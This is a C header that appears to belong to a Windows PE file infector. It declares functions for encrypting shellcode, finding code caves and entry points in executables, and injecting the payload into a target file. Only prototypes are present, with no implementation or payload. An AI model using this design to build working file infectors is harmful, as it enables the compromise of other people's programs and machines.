#pragma once
#ifndef InfectPE_header_h    // To make sure you don't declare the function more than once by including the header multiple times.
#define InfectPE_header_h
#include <Windows.h>
#include "ciphers_header.h"

#define suc_msg "EXECUTED\n"
#define noCave_msg "no cave in code\n"
#define noOpen_msg "Couldn't open\n"

enum State { Success, no_open, no_cave };

void decrypt_shellcode(const char* shellcode, int length_shellcode);
void encrypt_shellcode(const char* shellcode, int length_shellcode);
char* getResponse(State state, char* file_location);
DWORD find_codePointRawData(char* data);
DWORD find_finishCodeSection(char* data);
DWORD find_vEntryPoint(char* data);
DWORD find_OffsetRealEntryPoint(char* data);
DWORD find_baseCode(char* data);
int search_in_buffer(char* data, int size_data, DWORD* being_search, int size_being_search);
int find_cave(char* data, int size, int length_shellcode);
void print_bufferHex(char* data, int size);
char* infectPE_file(LPVOID file_location, const char* shellcode, int length_shellcode);
char* infect_main(LPVOID file_location, BOOL use_shell_detected, const char* shellcode);

#endif